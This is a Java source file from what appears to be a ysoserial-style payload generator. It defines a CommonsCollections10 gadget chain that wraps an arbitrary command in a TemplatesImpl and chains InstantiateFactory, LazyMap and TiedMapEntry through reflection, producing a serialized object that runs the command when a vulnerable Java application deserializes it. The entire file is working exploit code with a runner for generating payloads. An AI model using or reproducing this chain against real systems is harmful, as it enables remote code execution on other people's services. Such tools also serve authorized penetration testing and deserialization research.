package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

import static com.h2tg.ysogate.utils.Reflections.setFieldValue;

/**
 * @author su18
 */
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections10 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		// 使用 InstantiateFactory 代替 InstantiateTransformer
		InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});

		FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

		// 先放一个无关键要的 Transformer
		ConstantTransformer constantTransformer = new ConstantTransformer(1);

		Map     innerMap = new HashMap();
		LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);

		TiedMapEntry tme    = new TiedMapEntry(outerMap, "su18");
		Map          expMap = new HashMap();
		expMap.put(tme, "su19");

		setFieldValue(outerMap, "factory", factoryTransformer);

		outerMap.remove("su18");

		return expMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections10.class, args);
	}
}
